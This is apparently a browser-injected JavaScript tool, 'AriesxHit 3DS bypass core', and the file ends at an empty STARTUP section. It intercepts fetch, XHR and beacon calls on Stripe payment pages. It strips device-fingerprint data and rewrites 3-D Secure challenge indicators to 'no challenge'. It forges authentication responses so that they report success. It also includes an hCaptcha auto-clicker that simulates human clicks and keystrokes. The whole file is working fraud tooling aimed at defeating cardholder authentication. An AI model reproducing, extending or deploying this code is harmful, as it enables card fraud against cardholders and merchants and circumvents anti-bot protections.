// ARIESXHIT 3DS BYPASS CORE
// Injected directly into page context at document_start
// Based on ABUSE BYPASSER v4.2 logic with AriesxHit integration

(function() {
  'use strict';
  if (window.__ARIES_3DS_CORE__) return;
  window.__ARIES_3DS_CORE__ = true;

  let bypassCount = 0;
  let detectCount = 0;

  // ==================== STRIPE DETECTION ====================
  const STRIPE_DOMAINS = ['stripe.com', 'stripe.network'];
  const STRIPE_PATHS = ['/v1/3ds', '/v1/payment', '/v1/setup', '/v1/tokens', '/v1/sources', '/authenticate', '/confirm', '/challenge'];

  function isStripe(url) {
    if (!url) return false;
    try {
      const u = new URL(url, location.href);
      return STRIPE_DOMAINS.some(d => u.hostname.includes(d)) || STRIPE_PATHS.some(p => u.pathname.includes(p));
    } catch {
      return STRIPE_DOMAINS.some(d => url.includes(d)) || STRIPE_PATHS.some(p => url.includes(p));
    }
  }

  function isCritical(url) {
    if (!url) return false;
    const critical = ['3ds2/authenticate', '3ds2/challenge', 'verify_challenge', 'three_d_secure'];
    return critical.some(c => url.toLowerCase().includes(c));
  }

  // ==================== LOGGING ====================
  function log3DS(type, message) {
    console.log(`%c[3DS-${type.toUpperCase()}] ${message}`, `color: ${type === 'bypass' ? '#22c55e' : type === 'error' ? '#ef4444' : '#888'}; font-weight: bold`);
  }

  // Debug function to log all requests
  function debugRequest(url, method, body, type) {
    console.log(`%c[3DS-DEBUG] ${method} ${url.substring(0, 60)} (${type})`, 'color: #888; font-size: 10px');
    if (body && body.length < 500) {
      console.log(`%c[3DS-DEBUG] Body: ${body.substring(0, 200)}...`, 'color: #666; font-size: 10px');
    }
  }

  // ==================== ARIESxHIT INTEGRATION NOTIFICATIONS ====================

  // Send notifications through AriesxHit's existing system
  function notifyAriesxHit(type, message, card = null) {
    console.log(`[3DS-${type.toUpperCase()}] ${message}`);

    // Don't create log entries for 3DS bypass - just console log
    // The bypass works silently in the background
  }

  // ==================== CORE BYPASS LOGIC ====================
  function decodeAndModify(bodyStr) {
    if (!bodyStr) return { modified: false, body: bodyStr };

    let result = bodyStr;
    let modified = false;

    // Pattern 1: Direct locale strings (case insensitive)
    const localePatterns = [
      /en-US/gi, /en_US/gi, /en-GB/gi, /en_GB/gi,
      /"locale":"[^"]*"/gi,
      /"browser_locale":"[^"]*"/gi,
      /"language":"[^"]*"/gi,
      /locale=[^&]*/gi,
      /browser_locale=[^&]*/gi
    ];

    for (const p of localePatterns) {
      const before = result;
      result = result.replace(p, '');
      if (before !== result) modified = true;
    }

    // Pattern 2: URL-encoded base64 in three_d_secure[device_data]
    const deviceDataMatch = result.match(/three_d_secure%5Bdevice_data%5D=([^&]*)/);
    if (deviceDataMatch) {
      console.log('[3DS] Found device_data parameter, processing...');
      try {
        let encoded = deviceDataMatch[1];
        console.log('[3DS] Encoded data:', encoded.substring(0, 50) + '...');

        let decoded = decodeURIComponent(encoded);
        console.log('[3DS] URL decoded data:', decoded.substring(0, 50) + '...');

        let json = atob(decoded);
        console.log('[3DS] Base64 decoded JSON:', json.substring(0, 100) + '...');

        let obj = JSON.parse(json);
        console.log('[3DS] Parsed object keys:', Object.keys(obj));

        // Remove browser fingerprints (exactly as in user's code)
        delete obj.browser_locale;
        delete obj.timezone;
        delete obj.user_agent;
        delete obj.screen_width;
        delete obj.screen_height;
        delete obj.color_depth;

        // Also remove locale and language if present
        delete obj.locale;
        delete obj.language;

        console.log('[3DS] After removal, object keys:', Object.keys(obj));

        // Re-encode exactly as in user's code
        let newJson = JSON.stringify(obj);
        console.log('[3DS] New JSON:', newJson.substring(0, 100) + '...');

        let newBase64 = btoa(newJson);
        console.log('[3DS] New Base64:', newBase64.substring(0, 50) + '...');

        let newEncoded = encodeURIComponent(newBase64);
        console.log('[3DS] New URL encoded:', newEncoded.substring(0, 50) + '...');

        // Replace in request
        result = result.replace(deviceDataMatch[0], `three_d_secure%5Bdevice_data%5D=${newEncoded}`);

        modified = true;
        console.log('[3DS] Successfully modified device_data parameter');

      } catch(e) {
        console.error('[3DS] Error processing device_data:', e);
      }
    }

    // Pattern 3: JSON body modifications
    try {
      if (result.startsWith('{') || result.startsWith('%7B')) {
        let jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        let obj = JSON.parse(jsonStr);

        const removeKeys = ['browser_locale', 'locale', 'language', 'timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth'];

        function deepRemove(o) {
          if (typeof o !== 'object' || !o) return;
          for (const key of removeKeys) {
            if (key in o) {
              delete o[key];
              modified = true;
            }
          }
          for (const v of Object.values(o)) {
            if (typeof v === 'object') deepRemove(v);
          }
        }

        deepRemove(obj);
        if (modified) {
          result = JSON.stringify(obj);
          if (bodyStr.startsWith('%')) result = encodeURIComponent(result);
        }
      }
    } catch(e) {
      console.log('[3DS] JSON body processing failed:', e.message);
    }

    return { modified, body: result };
  }

  // ==================== 3DS REQUEST MODIFICATION ====================
  function modify3DSAuthenticateRequest(bodyStr) {
    if (!bodyStr) return { modified: false, body: bodyStr };

    let result = bodyStr;
    let modified = false;

    try {
      // Try to parse as JSON
      if (result.startsWith('{') || result.startsWith('%7B')) {
        let jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        let obj = JSON.parse(jsonStr);

        console.log('[3DS] 3DS authenticate request object:', Object.keys(obj));
        console.log('[3DS] Full request object:', JSON.stringify(obj, null, 2));

        // Look for challenge-related parameters
        if (obj.challenge_indicator) {
          console.log('[3DS] Found challenge_indicator:', obj.challenge_indicator);
          // Try to change challenge requirement
          if (obj.challenge_indicator === '01' || obj.challenge_indicator === 'challenge_required') {
            obj.challenge_indicator = '04'; // 04 = challenge not required
            modified = true;
            console.log('[3DS] Changed challenge_indicator to 04 (no challenge)');
          }
        }

        // Look for authentication preferences
        if (obj.authentication_indicator) {
          console.log('[3DS] Found authentication_indicator:', obj.authentication_indicator);
          obj.authentication_indicator = '01'; // 01 = payment transaction
          modified = true;
        }

        // Look for device channel
        if (obj.device_channel) {
          console.log('[3DS] Found device_channel:', obj.device_channel);
          // Keep as is, but log it
        }

        // Look for three_ds_requestor_challenge_ind
        if (obj.three_ds_requestor_challenge_ind) {
          console.log('[3DS] Found three_ds_requestor_challenge_ind:', obj.three_ds_requestor_challenge_ind);
          // 01 = No preference, 02 = No challenge, 03 = Challenge preferred, 04 = Challenge mandated
          if (obj.three_ds_requestor_challenge_ind !== '02') {
            obj.three_ds_requestor_challenge_ind = '02'; // No challenge requested
            modified = true;
            console.log('[3DS] Changed three_ds_requestor_challenge_ind to 02 (no challenge)');
          }
        }

        if (modified) {
          result = JSON.stringify(obj);
          if (bodyStr.startsWith('%')) result = encodeURIComponent(result);
          console.log('[3DS] Successfully modified 3DS authenticate request');
        }
      }

      // Also check URL-encoded parameters
      const params = new URLSearchParams(result);
      let paramsModified = false;

      if (params.has('three_ds_requestor_challenge_ind')) {
        const current = params.get('three_ds_requestor_challenge_ind');
        if (current !== '02') {
          params.set('three_ds_requestor_challenge_ind', '02');
          paramsModified = true;
          console.log('[3DS] Modified URL param three_ds_requestor_challenge_ind to 02');
        }
      }

      if (paramsModified) {
        result = params.toString();
        modified = true;
      }

    } catch (e) {
      console.log('[3DS] Error modifying 3DS authenticate request:', e.message);
    }

    return { modified, body: result };
  }

  // ==================== 3DS RESPONSE MODIFICATION ====================
  function modify3DSResponse(responseText) {
    if (!responseText) return { modified: false, response: responseText };

    let modified = false;
    let result = responseText;

    try {
      // Try to parse as JSON
      if (result.startsWith('{') || result.startsWith('%7B')) {
        let jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        let obj = JSON.parse(jsonStr);

        console.log('[3DS] 3DS response object keys:', Object.keys(obj));

        // Check for 3DS status fields
        if (obj.state) {
          console.log('[3DS] Found state field:', obj.state);
          // Change challenge states to success states
          if (obj.state === 'challenge_required' || obj.state === 'challenge_pending') {
            obj.state = 'challenge_completed';
            modified = true;
            console.log('[3DS] Changed state to challenge_completed');
          }
        }

        if (obj.status) {
          console.log('[3DS] Found status field:', obj.status);
          // Change requiring action to succeeded
          if (obj.status === 'requires_action') {
            obj.status = 'succeeded';
            modified = true;
            console.log('[3DS] Changed status to succeeded');
          }
        }

        // Look for authentication results
        if (obj.authentication_result) {
          console.log('[3DS] Found authentication_result');
          // Modify to indicate successful authentication
          if (obj.authentication_result.status !== 'Y') {
            obj.authentication_result.status = 'Y'; // Y = successful authentication
            obj.authentication_result.description = 'Authentication successful';
            modified = true;
            console.log('[3DS] Modified authentication_result to success');
          }
        }

        // Look for nested challenge data
        function modifyNested(obj) {
          if (typeof obj !== 'object' || !obj) return;

          if (obj.state === 'challenge_required') {
            obj.state = 'challenge_completed';
            modified = true;
          }
          if (obj.status === 'requires_action') {
            obj.status = 'succeeded';
            modified = true;
          }

          // Recursively check nested objects
          Object.values(obj).forEach(val => {
            if (typeof val === 'object') modifyNested(val);
          });
        }

        modifyNested(obj);

        if (modified) {
          result = JSON.stringify(obj);
          if (responseText.startsWith('%')) result = encodeURIComponent(result);
        }
      }

    } catch (e) {
      console.log('[3DS] Error modifying 3DS response:', e.message);
    }

    return { modified, response: result };
  }

  // ==================== REQUEST INTERCEPTION ====================

  // Helper function to convert body to string
  function bodyToString(b) {
    if (!b) return '';
    if (typeof b === 'string') return b;
    if (b instanceof URLSearchParams) return b.toString();
    if (b instanceof FormData) {
      const p = new URLSearchParams();
      b.forEach((v, k) => p.append(k, v));
      return p.toString();
    }
    if (b instanceof ArrayBuffer) return new TextDecoder().decode(b);
    try {
      return JSON.stringify(b);
    } catch (_) {
      return '';
    }
  }

  // ==================== FETCH INTERCEPTION ====================
  const origFetch = window.fetch;

  window.fetch = async function(input, init) {
    let url, method, headers, body;

    if (input instanceof Request) {
      url = input.url;
      method = input.method;
      headers = new Headers(input.headers);
      if (input.body) {
        try { const clone = input.clone(); body = await clone.text(); } catch(e) { body = null; }
      }
    } else {
      url = String(input || '');
      method = init?.method || 'GET';
      headers = init?.headers ? new Headers(init.headers) : new Headers();
      body = init?.body;
    }

    // Convert body to string if needed
    if (body && typeof body !== 'string') {
      body = bodyToString(body);
    }

    // Check if this is a Stripe request that needs bypass
    if (isStripe(url) && body && method !== 'GET') {
      detectCount++;
      debugRequest(url, method, body, 'fetch');

      if (isCritical(url)) {
        console.log(`[3DS] ★ CRITICAL: ${method} ${url.substring(0, 60)}`);
      }

      let result = decodeAndModify(body);

      // Special handling for 3DS authenticate requests
      if (url.includes('/3ds2/authenticate')) {
        console.log('[3DS] Processing 3DS authenticate request');
        console.log('[3DS] Original request body:', body.substring(0, 500) + '...');
        const authResult = modify3DSAuthenticateRequest(body);
        if (authResult.modified) {
          result = authResult;
          console.log('[3DS] Modified 3DS authenticate request - returning modified body');
          console.log('[3DS] Modified request body:', result.body.substring(0, 500) + '...');
        } else {
          console.log('[3DS] 3DS authenticate request was NOT modified');
        }
      }

      if (result.modified) {
        bypassCount++;
        log3DS('bypass', `Request modified successfully`);
        debugRequest(url, method, result.body, 'fetch-modified');

        // Notify AriesxHit that 3DS was bypassed
        notifyAriesxHit('bypass', '3DS request bypassed successfully');

        const newInit = {
          method,
          headers,
          body: result.body,
          credentials: init?.credentials || 'same-origin',
          mode: init?.mode || 'cors'
        };

        // Intercept the response for 3DS authenticate
        const response = await origFetch.call(window, url, newInit);

        if (url.includes('/3ds2/authenticate')) {
          console.log('[3DS] Intercepting 3DS authenticate response');

          // Clone and read the response
          const clonedResponse = response.clone();
          const responseText = await clonedResponse.text();

          console.log('[3DS] Original 3DS response:', responseText.substring(0, 200) + '...');

          // Try to modify the response to indicate success
          const modifiedResponse = modify3DSResponse(responseText);

          if (modifiedResponse.modified) {
            console.log('[3DS] Modified 3DS response:', modifiedResponse.response.substring(0, 200) + '...');

            // Return a new response with modified body
            return new Response(modifiedResponse.response, {
              status: response.status,
              statusText: response.statusText,
              headers: response.headers
            });
          }
        }

        return response;
      }
    }

    if (input instanceof Request) return origFetch.call(window, input, init);
    return origFetch.call(window, url, init || {});
  };

  // ==================== XHR INTERCEPTION ====================
  const XHR = XMLHttpRequest;
  const origOpen = XHR.prototype.open;
  const origSend = XHR.prototype.send;

  XHR.prototype.open = function(method, url) {
    this._ariesUrl = String(url || '');
    this._ariesMethod = method;
    return origOpen.apply(this, arguments);
  };

  XHR.prototype.send = function(body) {
    const url = this._ariesUrl;
    const method = this._ariesMethod;

    if (isStripe(url)) {
      detectCount++;
      debugRequest(url, method, body, 'xhr');

      if (isCritical(url)) sendLog('detect', `★ XHR CRITICAL: ${method} ${url.substring(0, 60)}`, url);

      let bodyStr = body;
      if (body && typeof body !== 'string') {
        bodyStr = bodyToString(body);
      }

      if (bodyStr && method !== 'GET') {
        let result = decodeAndModify(bodyStr);

        // Special handling for 3DS authenticate requests
        if (url.includes('/3ds2/authenticate')) {
          console.log('[3DS] Processing XHR 3DS authenticate request');
          const authResult = modify3DSAuthenticateRequest(bodyStr);
          if (authResult.modified) {
            result = authResult;
            console.log('[3DS] Modified XHR 3DS authenticate request');
          }
        }

        if (result.modified) {
          bypassCount++;
          log3DS('bypass', `XHR request bypassed`);
          debugRequest(url, method, result.body, 'xhr-modified');

          // Notify AriesxHit that 3DS was bypassed
          notifyAriesxHit('bypass', '3DS XHR request bypassed successfully');

          // Intercept the response for 3DS authenticate
          if (url.includes('/3ds2/authenticate')) {
            console.log('[3DS] Setting up XHR response interception for 3DS authenticate');
            this.addEventListener('load', function() {
              if (this.responseText) {
                console.log('[3DS] Original XHR 3DS response:', this.responseText.substring(0, 200) + '...');

                const modified = modify3DSResponse(this.responseText);
                if (modified.modified) {
                  console.log('[3DS] Modified XHR 3DS response:', modified.response.substring(0, 200) + '...');

                  // Override the responseText
                  Object.defineProperty(this, 'responseText', {
                    writable: true,
                    value: modified.response
                  });

                  // Also override response if it's JSON
                  try {
                    Object.defineProperty(this, 'response', {
                      writable: true,
                      value: modified.response
                    });
                  } catch (e) {}
                }
              }
            });
          }

          return origSend.call(this, result.body);
        }
      }
    }

    return origSend.apply(this, arguments);
  };

  // ==================== BEACON INTERCEPTION ====================
  if (navigator.sendBeacon) {
    const origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function(url, data) {
      if (isStripe(url)) {
        let bodyStr = data;
        if (data instanceof URLSearchParams) bodyStr = data.toString();
        else if (data instanceof FormData) {
          const params = new URLSearchParams();
          data.forEach((v, k) => params.append(k, v));
          bodyStr = params.toString();
        }
        else if (typeof data !== 'string') {
          try { bodyStr = JSON.stringify(data); } catch(e) {}
        }

        if (bodyStr) {
          const result = decodeAndModify(bodyStr);
          if (result.modified) {
            bypassCount++;
            log3DS('bypass', `Beacon request bypassed`);
            notifyAriesxHit('bypass', '3DS Beacon request bypassed successfully');
            return origBeacon(url, result.body);
          }
        }
      }
      return origBeacon(url, data);
    };
  }

  // ==================== HCaptcha Auto-Clicker ====================
  function initHCaptchaAutoClicker() {
    console.log('[HCaptcha] Initializing auto-clicker...');

    // Track last check time to prevent too frequent checks
    let lastCheckTime = 0;

    // Monitor for hCaptcha elements with more specific detection
    const observer = new MutationObserver((mutations) => {
      let shouldCheck = false;
      mutations.forEach((mutation) => {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeType === Node.ELEMENT_NODE &&
                (node.matches && node.matches('iframe[src*="hcaptcha"], #checkbox, [role="checkbox"], .challenge-container, [class*="hcaptcha"]') ||
                 node.querySelector && node.querySelector('iframe[src*="hcaptcha"], #checkbox, [role="checkbox"], .challenge-container, [class*="hcaptcha"]'))) {
              shouldCheck = true;
            }
          });
        }
      });
      if (shouldCheck) {
        const now = Date.now();
        if (now - lastCheckTime > 800) { // Minimum 800ms between mutation-triggered checks
          lastCheckTime = now;
          setTimeout(checkForHCaptcha, 200 + Math.random() * 400);
        }
      }
    });

    // Start observing
    observer.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: true,
      attributeFilter: ['class', 'id', 'style', 'src']
    });

    // More aggressive periodic check for hCaptcha
    const checkInterval = setInterval(() => {
      const now = Date.now();
      if (now - lastCheckTime > 1200) { // Minimum 1.2 seconds between periodic checks
        lastCheckTime = now;
        checkForHCaptcha();
      }
    }, 800 + Math.random() * 400); // Check every 0.8-1.2 seconds

    // Initial staggered checks
    setTimeout(checkForHCaptcha, 300);
    setTimeout(checkForHCaptcha, 1000);
    setTimeout(checkForHCaptcha, 2000);
    setTimeout(checkForHCaptcha, 3500);

    console.log('[HCaptcha] Auto-clicker initialized with aggressive detection');
  }

  function checkForHCaptcha() {
    try {
      // Priority 1: User's specific selector
      const hCaptchaCheckbox = document.querySelector('body.no-selection:nth-child(2) > div#anchor:nth-child(2) > div#anchor-wr:nth-child(1) > div#anchor-td:nth-child(1) > div#anchor-tc:nth-child(1) > div#anchor-state:nth-child(1) > div#checkbox:nth-child(1)');

      if (hCaptchaCheckbox && !hCaptchaCheckbox.hasAttribute('data-clicked')) {
        console.log('[HCaptcha] Found checkbox with user selector, clicking...');
        clickHCaptchaCheckbox(hCaptchaCheckbox);
        return;
      }

      // Priority 2: Check all iframes for hCaptcha content
      const iframes = document.querySelectorAll('iframe');
      for (const iframe of iframes) {
        try {
          const src = iframe.src || '';
          if (src.includes('hcaptcha.com') || src.includes('hcaptcha')) {
            console.log('[HCaptcha] Found hCaptcha iframe:', src);
            handleHCaptchaIframe(iframe);
            return;
          }
        } catch (e) {}
      }

      // Priority 3: Look for hCaptcha containers in current document
      const hCaptchaContainers = document.querySelectorAll('[class*="hcaptcha"], [id*="hcaptcha"], .h-captcha, #hcaptcha');
      for (const container of hCaptchaContainers) {
        if (!container.hasAttribute('data-clicked')) {
          console.log('[HCaptcha] Found hCaptcha container');
          handleHCaptchaContainer(container);
          return;
        }
      }

      // Priority 4: Generic iframe search
      const genericIframes = document.querySelectorAll('iframe');
      for (const iframe of genericIframes) {
        try {
          if (iframe.contentDocument) {
            const iframeContent = iframe.contentDocument;
            const hCaptchaElements = iframeContent.querySelectorAll('[class*="hcaptcha"], #checkbox, .checkbox, [role="checkbox"]');
            if (hCaptchaElements.length > 0) {
              console.log('[HCaptcha] Found hCaptcha in iframe content');
              handleHCaptchaIframe(iframe);
              return;
            }
          }
        } catch (e) {
          // Cross-origin iframe, can't access
        }
      }

      // Priority 5: Look for any checkbox-like elements that might be hCaptcha
      const checkboxes = document.querySelectorAll('[role="checkbox"], .checkbox, #checkbox');
      for (const checkbox of checkboxes) {
        if (!checkbox.hasAttribute('data-clicked') && isLikelyHCaptcha(checkbox)) {
          console.log('[HCaptcha] Found likely hCaptcha checkbox');
          clickHCaptchaCheckbox(checkbox);
          return;
        }
      }

    } catch (e) {
      console.log('[HCaptcha] Error checking for hCaptcha:', e.message);
    }
  }

  function isLikelyHCaptcha(element) {
    try {
      // More permissive detection - any checkbox-like element in hCaptcha context
      const elementClasses = (element.className || '').toLowerCase();
      const elementId = (element.id || '').toLowerCase();

      // Direct element checks
      if (elementId === 'checkbox' ||
          element.getAttribute('role') === 'checkbox' ||
          elementClasses.includes('checkbox') ||
          elementClasses.includes('hcaptcha')) {
        return true;
      }

      // Check if element is in an hCaptcha context
      const parentClasses = [];
      let parent = element.parentElement;
      for (let i = 0; i < 8 && parent; i++) { // Check more levels up
        const classes = (parent.className || '').toLowerCase();
        const id = (parent.id || '').toLowerCase();
        parentClasses.push(classes, id);
        parent = parent.parentElement;
      }

      // Look for hCaptcha-related class names or IDs
      const hCaptchaIndicators = parentClasses.some(cls =>
        cls.includes('hcaptcha') ||
        cls.includes('captcha') ||
        cls.includes('challenge') ||
        cls.includes('anchor') ||
        cls.includes('checkbox') ||
        cls.includes('verification')
      );

      // Check if element is inside an iframe with hCaptcha source
      let inHCaptchaFrame = false;
      try {
        let currentElement = element;
        for (let i = 0; i < 10 && currentElement; i++) {
          if (currentElement.tagName === 'IFRAME' &&
              currentElement.src &&
              currentElement.src.includes('hcaptcha')) {
            inHCaptchaFrame = true;
            break;
          }
          currentElement = currentElement.parentElement;
        }
      } catch (e) {
        // Ignore cross-origin errors
      }

      return hCaptchaIndicators || inHCaptchaFrame;
    } catch (e) {
      return false;
    }
  }

  function clickHCaptchaCheckbox(checkbox) {
    if (!checkbox) return;

    // Don't mark as clicked immediately - allow retries
    const elementId = checkbox.id || checkbox.className || Math.random().toString(36);
    if (checkbox.hasAttribute('data-click-attempts')) {
      const attempts = parseInt(checkbox.getAttribute('data-click-attempts') || '0');
      if (attempts >= 5) { // Max 5 attempts per element
        checkbox.setAttribute('data-clicked', 'true');
        console.log('[HCaptcha] Max attempts reached, stopping clicks');
        return;
      }
      checkbox.setAttribute('data-click-attempts', (attempts + 1).toString());
    } else {
      checkbox.setAttribute('data-click-attempts', '1');
    }

    const attemptNum = parseInt(checkbox.getAttribute('data-click-attempts') || '1');
    console.log(`[HCaptcha] Click attempt ${attemptNum}/5 on checkbox`);

    // Check if element is ready to be clicked (visible and not disabled)
    const isReady = checkbox.offsetWidth > 0 && checkbox.offsetHeight > 0 &&
                   !checkbox.disabled && !checkbox.hasAttribute('disabled') &&
                   getComputedStyle(checkbox).visibility !== 'hidden' &&
                   getComputedStyle(checkbox).display !== 'none';

    if (!isReady && attemptNum < 5) {
      console.log(`[HCaptcha] Element not ready for attempt ${attemptNum}, waiting...`);
      setTimeout(() => clickHCaptchaCheckbox(checkbox), 500 + Math.random() * 300);
      return;
    }

    try {
      // Shorter delay for retries, longer for first attempt
      const baseDelay = attemptNum === 1 ? 800 : 200;
      const delay = baseDelay + Math.random() * 300;

      setTimeout(() => {
        try {
          // Get element bounds for accurate clicking
          const rect = checkbox.getBoundingClientRect();
          const centerX = rect.left + rect.width / 2;
          const centerY = rect.top + rect.height / 2;

          console.log(`[HCaptcha] Attempt ${attemptNum}: Clicking at coordinates: ${centerX.toFixed(1)}, ${centerY.toFixed(1)}`);

          // Create comprehensive mouse events to simulate real click
          const events = [
            new MouseEvent('mouseenter', { bubbles: true, cancelable: true, clientX: centerX, clientY: centerY }),
            new MouseEvent('mousedown', { bubbles: true, cancelable: true, clientX: centerX, clientY: centerY, button: 0, buttons: 1 }),
            new MouseEvent('mouseup', { bubbles: true, cancelable: true, clientX: centerX, clientY: centerY, button: 0, buttons: 1 }),
            new MouseEvent('click', { bubbles: true, cancelable: true, clientX: centerX, clientY: centerY, button: 0, buttons: 1 })
          ];

          // Dispatch all events multiple times for reliability
          for (let i = 0; i < attemptNum; i++) {
            events.forEach(event => checkbox.dispatchEvent(event));
            // Small delay between event sets
            if (i < attemptNum - 1) {
              setTimeout(() => {}, 50);
            }
          }

          // Multiple direct clicks as fallback
          for (let i = 0; i < Math.min(attemptNum, 3); i++) {
            setTimeout(() => checkbox.click(), i * 100);
          }

          // Try focus and keyboard activation with increasing intensity
          checkbox.focus();
          const keyEvents = [];
          // Add more spacebar presses for retries
          for (let i = 0; i < Math.min(attemptNum, 3); i++) {
            keyEvents.push(
              new KeyboardEvent('keydown', { key: ' ', keyCode: 32, bubbles: true }),
              new KeyboardEvent('keyup', { key: ' ', keyCode: 32, bubbles: true })
            );
          }
          keyEvents.forEach((event, index) => {
            setTimeout(() => checkbox.dispatchEvent(event), index * 50);
          });

          console.log(`[HCaptcha] ✅ Attempt ${attemptNum}: Checkbox clicked with all methods`);

          // Check if it worked after a delay
          setTimeout(() => {
            const success = checkHCaptchaSuccess();
            if (!success && attemptNum < 5) {
              console.log(`[HCaptcha] Attempt ${attemptNum} failed, retrying...`);
              // Retry with increased intensity
              setTimeout(() => clickHCaptchaCheckbox(checkbox), 1000 + Math.random() * 500);
            } else if (success) {
              console.log('[HCaptcha] ✅ Success confirmed, stopping retries');
              checkbox.setAttribute('data-clicked', 'true');
            } else {
              console.log('[HCaptcha] ❌ Max attempts reached without success');
              checkbox.setAttribute('data-clicked', 'true');
            }
          }, 1500 + (attemptNum * 200)); // Longer wait for retries

        } catch (e) {
          console.error(`[HCaptcha] Error in attempt ${attemptNum}:`, e.message);
          if (attemptNum < 5) {
            setTimeout(() => clickHCaptchaCheckbox(checkbox), 500);
          }
        }
      }, delay);

    } catch (e) {
      console.error('[HCaptcha] Error setting up click attempt:', e.message);
    }
  }

  function checkHCaptchaSuccess() {
    try {
      // Look for success indicators in current document
      const successIndicators = [
        '.hcaptcha-success',
        '[class*="success"]',
        '.checkmark',
        '[aria-checked="true"]',
        '.verified',
        '[class*="verified"]',
        '.completed',
        '[class*="completed"]',
        '[class*="passed"]',
        '.passed'
      ];

      // Check all iframes for success indicators
      const iframes = document.querySelectorAll('iframe');
      for (const iframe of iframes) {
        try {
          const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
          if (iframeDoc) {
            for (const indicator of successIndicators) {
              if (iframeDoc.querySelector(indicator)) {
                console.log('[HCaptcha] ✅ Verification successful (found in iframe)');
                return true;
              }
            }
            // Also check for disappeared challenge elements
            if (!iframeDoc.querySelector('#checkbox, [role="checkbox"], .challenge-container')) {
              console.log('[HCaptcha] ✅ Challenge elements disappeared (likely success)');
              return true;
            }
          }
        } catch (e) {
          // Cross-origin iframe
        }
      }

      // Check current document
      for (const indicator of successIndicators) {
        if (document.querySelector(indicator)) {
          console.log('[HCaptcha] ✅ Verification successful');
          return true;
        }
      }

      // Check if checkbox is now checked
      const checkboxes = document.querySelectorAll('#checkbox, [role="checkbox"], .checkbox');
      for (const cb of checkboxes) {
        if (cb.getAttribute('aria-checked') === 'true' || cb.checked) {
          console.log('[HCaptcha] ✅ Checkbox is now checked');
          return true;
        }
      }

      // Check if challenge elements have disappeared
      const challengeElements = document.querySelectorAll('.challenge-container, [class*="challenge"], [id*="challenge"]');
      if (challengeElements.length === 0) {
        console.log('[HCaptcha] ✅ No challenge elements found (likely completed)');
        return true;
      }

      console.log('[HCaptcha] ⚠️ Verification status unclear - may need manual completion');
      return false;

    } catch (e) {
      console.log('[HCaptcha] Error checking success:', e.message);
      return false;
    }
  }

  function handleHCaptchaIframe(iframe) {
    try {
      iframe.setAttribute('data-clicked', 'true');
      console.log('[HCaptcha] Handling hCaptcha iframe');

      // Method 1: Try to access iframe content directly
      try {
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        if (iframeDoc) {
          const checkbox = iframeDoc.querySelector('#checkbox, [role="checkbox"], .checkbox, [class*="checkbox"]');
          if (checkbox) {
            console.log('[HCaptcha] Found checkbox in iframe, clicking...');
            clickHCaptchaCheckbox(checkbox);
            return;
          }

          // Try to find any clickable elements
          const clickableElements = iframeDoc.querySelectorAll('button, [role="button"], [onclick], input[type="submit"]');
          if (clickableElements.length > 0) {
            console.log('[HCaptcha] Found clickable elements in iframe');
            clickableElements.forEach(el => {
              setTimeout(() => el.click(), Math.random() * 300 + 100);
            });
            return;
          }
        }
      } catch (e) {
        console.log('[HCaptcha] Could not access iframe content (cross-origin)');
      }

      // Method 2: Send keyboard events to iframe (spacebar/enter to activate)
      setTimeout(() => {
        try {
          console.log('[HCaptcha] Sending keyboard events to iframe');
          const keyEvents = [
            new KeyboardEvent('keydown', { key: ' ', keyCode: 32, bubbles: true }),
            new KeyboardEvent('keyup', { key: ' ', keyCode: 32, bubbles: true }),
            new KeyboardEvent('keydown', { key: 'Enter', keyCode: 13, bubbles: true }),
            new KeyboardEvent('keyup', { key: 'Enter', keyCode: 13, bubbles: true })
          ];

          keyEvents.forEach(event => iframe.dispatchEvent(event));

          // Also try mouse events on iframe
          const mouseEvents = ['mousedown', 'mouseup', 'click'];
          mouseEvents.forEach(eventType => {
            const event = new MouseEvent(eventType, {
              bubbles: true,
              cancelable: true,
              clientX: iframe.getBoundingClientRect().left + iframe.offsetWidth / 2,
              clientY: iframe.getBoundingClientRect().top + iframe.offsetHeight / 2,
              button: 0,
              buttons: 1
            });
            iframe.dispatchEvent(event);
          });

        } catch (e) {
          console.log('[HCaptcha] Error sending events to iframe:', e.message);
        }
      }, Math.random() * 500 + 300);

    } catch (e) {
      console.error('[HCaptcha] Error handling hCaptcha iframe:', e.message);
    }
  }

  function handleHCaptchaContainer(container) {
    try {
      container.setAttribute('data-clicked', 'true');
      console.log('[HCaptcha] Handling hCaptcha container');

      // Look for checkboxes within the container
      const checkboxes = container.querySelectorAll('#checkbox, [role="checkbox"], .checkbox, [class*="checkbox"]');
      if (checkboxes.length > 0) {
        console.log('[HCaptcha] Found checkboxes in container');
        checkboxes.forEach(checkbox => clickHCaptchaCheckbox(checkbox));
        return;
      }

      // Look for iframes within the container
      const iframes = container.querySelectorAll('iframe');
      if (iframes.length > 0) {
        console.log('[HCaptcha] Found iframes in container');
        iframes.forEach(iframe => handleHCaptchaIframe(iframe));
        return;
      }

      // As a fallback, click the container itself
      setTimeout(() => {
        container.click();
        console.log('[HCaptcha] Clicked container element');
      }, Math.random() * 300 + 200);

    } catch (e) {
      console.error('[HCaptcha] Error handling hCaptcha container:', e.message);
    }
  }

  function handleHCaptchaElement(element) {
    try {
      element.setAttribute('data-clicked', 'true');

      // If it's an iframe, handle it specifically
      if (element.tagName === 'IFRAME') {
        handleHCaptchaIframe(element);
        return;
      }

      // Try to click the element itself
      setTimeout(() => {
        element.click();
        console.log('[HCaptcha] Clicked hCaptcha element');
      }, Math.random() * 500 + 200);

    } catch (e) {
      console.error('[HCaptcha] Error handling hCaptcha element:', e.message);
    }
  }

  // ==================== ARIESXHIT INTEGRATION ====================

  // Signal to AriesxHit core that 3DS bypass is ready
  window.__ARIES_3DS_READY__ = true;

  // Listen for AriesxHit state updates
  window.addEventListener('message', (event) => {
    if (event.data?.type === 'aries-state-update' && event.data.autoHitActive !== undefined) {
      // Adjust bypass behavior based on auto-hit state
      console.log('[3DS] Auto-hit state changed:', event.data.autoHitActive);
    }
  });

  // ==================== STARTUP ====================
